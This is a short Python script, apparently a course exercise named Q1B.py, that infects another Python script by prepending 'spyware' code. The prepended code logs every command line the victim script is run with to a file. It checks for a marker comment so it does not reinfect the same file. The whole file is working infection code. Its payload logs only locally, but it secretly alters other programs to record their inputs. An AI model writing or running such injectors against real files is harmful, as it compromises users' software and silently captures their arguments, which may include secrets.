import os
import sys

INFECTED = '# AbdulChowdhury'  # Marker to detect infection

def is_script(filename):  
    """Check if the given Python file is a script (contains if __name__ == '__main__')."""
    with open(filename, 'r') as file:
        content = file.read()
    return "if __name__ == '__main__':" in content or 'if __name__ == "__main__":' in content

def is_infected(filename):  
    """Check if the given Python file is already infected (contains virus marker)."""
    with open(filename, 'r') as file:
        content = file.read()
    return INFECTED in content

def inject_spyware(filename):  
    """Modify the script to log command-line arguments to Q1B.out."""
    with open(filename, 'r') as file:
        original_content = file.read()

    spyware_code = f"""\n{INFECTED}
import sys
command_line = ' '.join(sys.argv)
with open('Q1B.out', 'a') as output_file:
    output_file.write(command_line + '\\n')\n"""

    # Rewrite the file with spyware inserted at the beginning
    with open(filename, 'w') as file:
        file.write(spyware_code + original_content)

def main():  
    if len(sys.argv) != 2:
        print("Usage: python3 Q1B.py <file.py>")
        sys.exit(1)
  
    filename = sys.argv[1]
  
    if not os.path.exists(filename):
        print(f"Error: File '{filename}' does not exist.")
        sys.exit(1)
  
    if not is_script(filename):
        print(f"Error: '{filename}' is not a script (missing `if __name__ == '__main__'`).")
        sys.exit(1)
  
    if is_infected(filename):
        print(f"Error: '{filename}' is already infected.")
        sys.exit(1)

    inject_spyware(filename)
    print(f"Success: Spyware injected into '{filename}'.")

if __name__ == "__main__":
    main()
